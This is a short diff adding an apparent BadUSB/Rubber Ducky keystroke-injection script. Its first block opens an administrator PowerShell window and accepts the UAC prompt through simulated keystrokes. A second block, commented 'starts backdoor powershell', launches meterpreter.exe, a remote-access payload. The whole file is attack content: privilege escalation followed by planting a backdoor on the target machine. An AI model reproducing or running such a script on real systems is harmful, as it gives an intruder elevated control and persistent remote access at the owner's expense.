@@ -1,0 +1,11 @@
+REM opens admin powershell window
+DELAY 1000
+GUI x
+DOWNARROW REPEAT 11
+ENTER
+ALT y
+
+——————————————————
+
+REM starts backdoor powershell 
+C:\> Start-Process meterpreter.exe
